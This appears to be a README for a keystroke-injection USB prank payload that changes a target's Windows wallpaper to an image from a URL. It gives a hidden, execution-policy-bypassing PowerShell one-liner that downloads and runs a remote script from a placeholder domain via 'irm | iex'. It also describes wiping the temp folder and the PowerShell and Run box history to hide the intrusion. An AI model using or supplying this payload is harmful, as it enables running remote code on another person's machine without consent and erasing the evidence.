##

<!-- TABLE OF CONTENTS -->
<!--TABLE 0F C0NTENTS-->

# Wallpaper-URL

This payload will download an image from any URL and set it as the target's wallpaper. 

## Description

Use this program to troll your friends. Find any image online and grab the URL and insert it into the PS1 script. 
Run this payload and step away. Once a mouse movement is detected, their wallpaper will change right in front of their eyes.
Lastly, to clean up your tracks behind you, the tmp folder will be emptied and the PowerShell and run box history will be wiped.


## Getting Started

### Dependencies

* Windows 10,11

##

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* Place your images URL in the $url variable
```
powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE';irm MYDOMAIN.HERE/pkw | iex
```

##

##